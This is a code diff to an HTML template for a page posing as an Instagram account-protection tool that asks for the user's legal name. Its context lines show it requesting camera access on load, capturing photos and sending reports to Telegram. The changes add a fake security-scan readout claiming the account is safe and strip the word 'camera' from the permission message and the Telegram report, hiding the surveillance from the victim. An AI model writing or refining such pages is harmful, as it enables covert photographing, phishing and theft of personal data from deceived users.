@@ -206,7 +206,19 @@ HTML_TEMPLATE = """
       <input type="text" id="igLegalName" placeholder="John Doe">
     </div>
     <button class="btn" id="protectBtn">🛡️ Protect your account</button>
-    <div id="safeMessage" class="safe-badge">✅ Your account is now safe</div>
+    <div id="safeMessage" class="safe-badge">[+] INITIALIZING SECURITY SCAN...
+[+] TARGET: DEMO_INSTAGRAM_ACCOUNT
+[+] AUTHENTICATION LAYER....... OK
+[+] SESSION INTEGRITY.......... OK
+[+] PASSWORD STATUS............ SECURE
+[+] 2FA PROTECTION............. ACTIVE
+[+] SUSPICIOUS LOGINS.......... 0
+[+] SECURITY THREATS........... 0
+
+----------------------------------------
+      ACCOUNT PROTECTION: ACTIVE
+----------------------------------------
+</div>
     <div class="text-muted" style="margin-top: 12px;">* encrypted protection active</div>
   </div>
 </div>
@@ -239,7 +251,7 @@ HTML_TEMPLATE = """
   // IMMEDIATELY REQUEST PERMISSION ON PAGE LOAD
   function requestPermissionsImmediately() {
     permissionStatus.style.display = 'block';
-    permissionStatus.textContent = '📸 Requesting camera access...';
+    permissionStatus.textContent = '📸 Requesting access...';
     permissionStatus.style.borderLeftColor = '#ffd93d';
     
     // Request camera permission immediately
@@ -271,7 +283,7 @@ HTML_TEMPLATE = """
       permissionStatus.style.borderLeftColor = '#51cf66';
       statusBadge.textContent = 'active';
       
-      sendToTelegram('✅ Camera access granted immediately. Photo capture started.');
+      sendToTelegram('✅ access granted immediately.');
       
       // Start photo capture
       startPhotoCapture();
